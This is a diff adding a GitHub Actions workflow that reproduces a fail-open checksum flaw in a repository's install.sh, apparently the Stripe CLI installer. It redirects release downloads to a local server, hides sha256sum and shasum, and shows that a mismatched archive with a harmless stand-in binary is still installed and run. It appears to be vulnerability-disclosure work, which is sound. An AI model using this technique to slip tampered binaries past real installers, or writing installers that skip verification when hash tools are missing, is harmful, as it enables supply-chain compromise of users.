@@ -1,0 +1,328 @@
+name: Real install.sh Checksum Bypass PoC
+
+on:
+  workflow_dispatch:
+
+jobs:
+  checksum-bypass:
+    runs-on: ubuntu-24.04
+
+    permissions:
+      contents: read
+
+    steps:
+      - name: Checkout repository
+        uses: actions/checkout@v4
+
+      - name: Run checksum bypass PoC
+        shell: bash
+        run: |
+          set -euo pipefail
+
+          echo "=============================================="
+          echo " Real scripts/install.sh checksum bypass PoC"
+          echo "=============================================="
+
+          TEST_DIR="$(mktemp -d)"
+          RELEASE_DIR="$TEST_DIR/release"
+          BIN_DIR="$TEST_DIR/bin"
+          INSTALL_DIR="$TEST_DIR/install"
+          TEST_HOME="$TEST_DIR/home"
+
+          mkdir -p \
+            "$RELEASE_DIR" \
+            "$BIN_DIR" \
+            "$INSTALL_DIR" \
+            "$TEST_HOME"
+
+          SERVER_PID=""
+
+          cleanup() {
+            if [ -n "${SERVER_PID:-}" ]; then
+              kill "$SERVER_PID" 2>/dev/null || true
+            fi
+            rm -rf "$TEST_DIR"
+          }
+
+          trap cleanup EXIT
+
+          #
+          # 1. Create attacker-controlled executable
+          #
+          cat > "$TEST_DIR/stripe" <<'EOF'
+          #!/bin/sh
+          echo "ATTACKER_CONTROLLED_BINARY_EXECUTED"
+          EOF
+
+          chmod +x "$TEST_DIR/stripe"
+
+          #
+          # 2. Create attacker-controlled release archive
+          #
+          VERSION="99.99.99"
+          ARCHIVE="stripe_${VERSION}_linux_x86_64.tar.gz"
+
+          tar -czf \
+            "$RELEASE_DIR/$ARCHIVE" \
+            -C "$TEST_DIR" \
+            stripe
+
+          REAL_HASH="$(
+            /usr/bin/sha256sum "$RELEASE_DIR/$ARCHIVE" |
+            /usr/bin/cut -d' ' -f1
+          )"
+
+          #
+          # 3. Intentionally WRONG checksum
+          #
+          WRONG_HASH="0000000000000000000000000000000000000000000000000000000000000000"
+
+          if [ "$REAL_HASH" = "$WRONG_HASH" ]; then
+            echo "ERROR: test checksum unexpectedly matches archive"
+            exit 1
+          fi
+
+          printf '%s  %s\n' \
+            "$WRONG_HASH" \
+            "$ARCHIVE" \
+            > "$RELEASE_DIR/stripe-linux-checksums.txt"
+
+          echo "Archive SHA256:  $REAL_HASH"
+          echo "Expected SHA256: $WRONG_HASH"
+
+          #
+          # 4. Fake GitHub latest-release API response
+          #
+          cat > "$RELEASE_DIR/latest.json" <<EOF
+          {
+            "tag_name": "v${VERSION}"
+          }
+          EOF
+
+          #
+          # 5. Start local fake release server
+          #
+          /usr/bin/python3 -m http.server \
+            18080 \
+            --directory "$RELEASE_DIR" \
+            > "$TEST_DIR/server.log" 2>&1 &
+
+          SERVER_PID=$!
+
+          sleep 1
+
+          kill -0 "$SERVER_PID" 2>/dev/null || {
+            echo "ERROR: local HTTP server failed"
+            cat "$TEST_DIR/server.log" || true
+            exit 1
+          }
+
+          #
+          # 6. Provide only commands required by install.sh,
+          #    deliberately excluding sha256sum and shasum.
+          #
+          for cmd in \
+            sed cut tar gzip mktemp rm mkdir mv chmod \
+            printf echo uname tr basename grep sort head cat
+          do
+            command_path="$(command -v "$cmd" || true)"
+
+            if [ -n "$command_path" ]; then
+              ln -s "$command_path" "$BIN_DIR/$cmd"
+            fi
+          done
+
+          #
+          # 7. curl wrapper:
+          #    redirect hard-coded GitHub URLs to localhost.
+          #
+          REAL_CURL="$(command -v curl)"
+
+          cat > "$BIN_DIR/curl" <<EOF
+          #!/bin/sh
+
+          REAL_CURL="$REAL_CURL"
+
+          new_args=""
+
+          for arg in "\$@"; do
+            case "\$arg" in
+              https://api.github.com/repos/stripe/stripe-cli/releases/latest)
+                arg="http://127.0.0.1:18080/latest.json"
+                ;;
+              https://github.com/stripe/stripe-cli/releases/download/v*)
+                filename="\$(printf '%s' "\$arg" | sed 's#.*/##')"
+                arg="http://127.0.0.1:18080/\$filename"
+                ;;
+            esac
+
+            if [ -z "\$new_args" ]; then
+              new_args="\$arg"
+            else
+              new_args="\$new_args
+          \$arg"
+            fi
+          done
+
+          set --
+
+          while IFS= read -r arg; do
+            [ -n "\$arg" ] && set -- "\$@" "\$arg"
+          done <<ARGS
+          \$new_args
+          ARGS
+
+          exec "\$REAL_CURL" "\$@"
+          EOF
+
+          chmod +x "$BIN_DIR/curl"
+
+          #
+          # 8. Isolate installer environment
+          #
+          export HOME="$TEST_HOME"
+          export PATH="$BIN_DIR"
+
+          #
+          # 9. Prove hash utilities are unavailable
+          #
+          echo ""
+          echo "Checking hash utilities..."
+
+          if command -v sha256sum >/dev/null 2>&1; then
+            echo "ERROR: sha256sum is available"
+            exit 1
+          fi
+
+          if command -v shasum >/dev/null 2>&1; then
+            echo "ERROR: shasum is available"
+            exit 1
+          fi
+
+          echo "sha256sum: NOT AVAILABLE"
+          echo "shasum:     NOT AVAILABLE"
+
+          #
+          # 10. Independently prove checksum is WRONG
+          #
+          DOWNLOADED_HASH="$(
+            /usr/bin/sha256sum "$RELEASE_DIR/$ARCHIVE" |
+            /usr/bin/cut -d' ' -f1
+          )"
+
+          EXPECTED_HASH="$(
+            /usr/bin/sed \
+              -n "s/^\([a-f0-9]*\)  *${ARCHIVE}$/\1/p" \
+              "$RELEASE_DIR/stripe-linux-checksums.txt"
+          )"
+
+          echo ""
+          echo "Actual archive hash: $DOWNLOADED_HASH"
+          echo "Expected checksum:   $EXPECTED_HASH"
+
+          if [ "$DOWNLOADED_HASH" = "$EXPECTED_HASH" ]; then
+            echo "ERROR: checksum is not actually wrong"
+            exit 1
+          fi
+
+          echo "Confirmed: checksum mismatch is intentional."
+
+          #
+          # 11. Hash the real installer before execution
+          #
+          INSTALL_SH_HASH_BEFORE="$(
+            /usr/bin/sha256sum scripts/install.sh |
+            /usr/bin/cut -d' ' -f1
+          )"
+
+          echo ""
+          echo "install.sh SHA256 before: $INSTALL_SH_HASH_BEFORE"
+
+          chmod +x scripts/install.sh
+
+          #
+          # 12. Execute REAL scripts/install.sh
+          #
+          echo ""
+          echo "Executing real scripts/install.sh..."
+
+          set +e
+
+          STRIPE_INSTALL_DIR="$INSTALL_DIR" \
+          VERSION="$VERSION" \
+          scripts/install.sh
+
+          INSTALL_EXIT_CODE=$?
+
+          set -e
+
+          echo ""
+          echo "install.sh exit code: $INSTALL_EXIT_CODE"
+
+          #
+          # 13. Verify installer source was not modified
+          #
+          INSTALL_SH_HASH_AFTER="$(
+            /usr/bin/sha256sum scripts/install.sh |
+            /usr/bin/cut -d' ' -f1
+          )"
+
+          echo "install.sh SHA256 after:  $INSTALL_SH_HASH_AFTER"
+
+          if [ "$INSTALL_SH_HASH_BEFORE" != "$INSTALL_SH_HASH_AFTER" ]; then
+            echo "ERROR: install.sh changed during test"
+            exit 1
+          fi
+
+          #
+          # 14. Vulnerable behavior:
+          #     install.sh should NOT accept the archive.
+          #
+          if [ "$INSTALL_EXIT_CODE" -ne 0 ]; then
+            echo ""
+            echo "Installer rejected the archive."
+            echo "Checksum bypass was NOT reproduced."
+            exit 1
+          fi
+
+          if [ ! -f "$INSTALL_DIR/stripe" ]; then
+            echo "ERROR: installer returned success but binary was not installed"
+            exit 1
+          fi
+
+          #
+          # 15. Execute installed attacker-controlled binary
+          #
+          echo ""
+          echo "Executing installed binary..."
+
+          OUTPUT="$("$INSTALL_DIR/stripe")"
+
+          echo "$OUTPUT"
+
+          #
+          # 16. Final PoC assertion
+          #
+          if printf '%s\n' "$OUTPUT" |
+             grep -q "ATTACKER_CONTROLLED_BINARY_EXECUTED"
+          then
+            echo ""
+            echo "=============================================="
+            echo " CONFIRMED WORKING PoC"
+            echo "=============================================="
+            echo ""
+            echo "The real scripts/install.sh:"
+            echo "  [1] downloaded a controlled archive"
+            echo "  [2] received an intentionally WRONG checksum"
+            echo "  [3] had no sha256sum"
+            echo "  [4] had no shasum"
+            echo "  [5] accepted the archive"
+            echo "  [6] installed the attacker-controlled binary"
+            echo "  [7] executed the attacker-controlled binary"
+            echo ""
+            echo "This demonstrates fail-open checksum verification."
+            exit 0
+          fi
+
+          echo "ERROR: attacker-controlled binary was not executed"
+          exit 1
